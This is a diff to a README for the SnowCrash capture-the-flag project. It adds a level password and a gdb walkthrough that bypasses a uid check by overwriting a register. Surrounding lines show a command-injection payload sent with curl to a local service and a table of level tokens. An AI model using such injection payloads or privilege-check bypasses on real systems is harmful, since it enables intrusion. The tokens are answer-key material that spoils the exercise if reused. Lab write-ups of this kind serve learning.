@@ -25,6 +25,7 @@ This project will be an introduction to cyber security.
 | level11 | feulo4b72j7edeahuete3no7c |
 | level12 | fa6v5ateaw21peobuub8ipe6s |
 | level13 | g1qKMiRpXf53AWhDaU7FEkczr |
+| level14 | 2A31L79asukciNyi8uppkEuSx |
 
 ## Script
 
@@ -178,4 +179,25 @@ GET /Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s HTTP/1.1
 ```bash
 level12@SnowCrash:~$ echo '#!/bin/bash' > /tmp/FLAG && echo 'getflag > /tmp/FLAG' >> /tmp/FLAG && chmod 777 /tmp/FLAG && curl 'localhost:4646?x=`/???/flag`&y=toto' && cat /tmp/FLAG
 .Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
+### level13
+
+```bash
+level13@SnowCrash:~$ gdb level13
+(gdb) b getuid
+Breakpoint 1 at 0x8048380
+(gdb) r
+Starting program: /home/user/level13/level13
+Breakpoint 1, 0xb7ee4cc0 in getuid () from /lib/i386-linux-gnu/libc.so.6
+(gdb) s
+Single stepping until exit from function getuid,
+which has no line number information.
+0x0804859a in main ()
+(gdb) set $eax=4242
+(gdb) info register $eax
+eax            0x1092   4242
+(gdb) c
+Continuing.
+your token is 2A31L79asukciNyi8uppkEuSx
+[Inferior 1 (process 1956) exited with code 050]
 ```
